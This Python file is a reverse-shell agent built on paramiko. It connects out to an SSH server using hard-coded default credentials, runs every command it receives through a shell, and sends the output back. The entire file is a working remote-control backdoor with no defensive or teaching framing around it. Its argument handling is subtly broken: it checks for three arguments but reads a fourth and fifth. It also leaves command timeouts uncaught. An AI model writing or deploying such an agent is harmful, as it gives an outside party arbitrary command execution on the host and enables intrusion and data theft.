import paramiko
import subprocess
import sys

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999
DEFAULT_USERNAME = "user"
DEFAULT_PASSWORD = "password"


def agent(server_address, server_port, username, password):
    #instantiate the ssh client
    client = paramiko.SSHClient()

    #optional is using keys instead of password auth
    #client.load_host_key('/path/to/file')

    #auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #connect to ssh server
    client.connect(server_address, port=server_port, username=username, password=password)

    #get ssh session
    client_session = client.get_transport().open_session()

    if client_session.active and not client_session.closed:
        #wait for command, execute and send result ouput
        while True:
            #use subprocess run with timeout of 30 seconds
            try:
                command = client_session.recv(1024).decode('utf-8')
                if command.lower() == "exit":
                    client_session.close()
                    return
                else:
                    command_output = subprocess.run( command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, timeout=30)
                    #send back the resulting output
                    if len(command_output.stderr.decode('utf-8')):
                        client_session.send(command_output.stderr.decode('utf-8'))
                    elif len(command_output.stdout.decode('utf-8')):
                        client_session.send(command_output.stdout.decode('utf-8'))
                    else:
                        client_session.send('null')
            except subprocess.CalledProcessError as err:
                client_session.send(str(err))
    client_session.close()
    return

def main():
    if len(sys.argv) == 3:
        server_address = sys.argv[1]
        server_port = int(sys.argv[2])
        username = sys.argv[3]
        password = sys.argv[4]
    else:
        server_address = DEFAULT_HOST
        server_port = DEFAULT_PORT
        username = DEFAULT_USERNAME
        password = DEFAULT_PASSWORD

    agent(server_address, server_port, username, password)

if __name__ == "__main__":
    main()
